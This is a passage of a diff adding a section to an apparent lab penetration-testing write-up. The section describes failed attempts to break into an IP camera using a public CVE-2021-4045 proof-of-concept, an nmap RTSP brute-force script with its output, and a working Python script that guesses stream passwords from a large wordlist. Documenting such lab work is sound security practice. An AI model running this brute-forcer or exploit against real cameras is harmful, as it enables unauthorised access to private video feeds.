@@ -70,6 +70,75 @@ Once connected to the network, we can run several commands to find an attack sur
 
 ![rpcclient](./assets/rpcclient.PNG)
 
+## 1b. Attempting to hack the camera
+
+Using fing I scanned the network to be sure what IP the camera has.
+
+![scan](./assets/scan.png)
+
+So with the camera model and name I found multiple exploit and github projects.
+
+The first one is [pwntapo](https://github.com/hacefresko/CVE-2021-4045-PoC)
+
+With this tool there are 2 ways to launch it. Either trying to get a shell or trying to create a login for the stream.
+
+![pwn](./assets/pwntapo.PNG) ![pwn2](./assets/pwntapo2.png)
+
+But sadly none of them worked, so I did 2 nmap command. 
+One scan just to see the other open port, and the one script to see the details of the camera stream.
+
+![nmapcam](./assets/nmapcam.PNG) 
+
+> nmap --script rtsp-url-brute -p 554 10.10.71.236
+
+```
+PORT    STATE SERVICE
+554/tcp open  rtsp
+| rtsp-url-brute:
+|   discovered:
+|     rtsp://camera.example.com/mpeg4
+|   other responses:
+|     401:
+|_      rtsp://camera.example.com/live/mpeg4
+```
+
+With that I found the main stream of the camera that was : ``rtsp://10.10.71.236/stream1``
+
+But it needed a login so I tried common login in vain.
+
+So I made a small python script to brute force it.
+
+```
+import concurrent.futures
+import cv2
+import sys
+
+def test_password(word, url):
+    try:
+        test_url = url.replace("password", word)
+        cap = cv2.VideoCapture(test_url)
+        if cap.isOpened():
+            print("Valid URL: {}".format(test_url))
+            sys.exit(0)
+        cap.release()
+    except Exception as e:
+        print(f"Error testing password: {e}")
+
+def test_rtsp_url_multiprocessing(url, wordlist_file):
+    with open(wordlist_file, 'r') as f:
+        words = f.read().splitlines()
+
+    with concurrent.futures.ProcessPoolExecutor() as executor:
+        executor.map(test_password, words, [url]*len(words))
+
+if __name__ == "__main__":
+    url = "rtsp://wnoob1:password@10.10.71.236/stream1"
+    wordlist_file = "10-million-password-list-top-1000000.txt"
+    test_rtsp_url_multiprocessing(url, wordlist_file)
+```
+
+I have not been able to successfully get the login but with more time, as the script takes time, it will be a success.
+
 ## 2. LLMNR Poisoning
 
 ### What is LLMNR ?
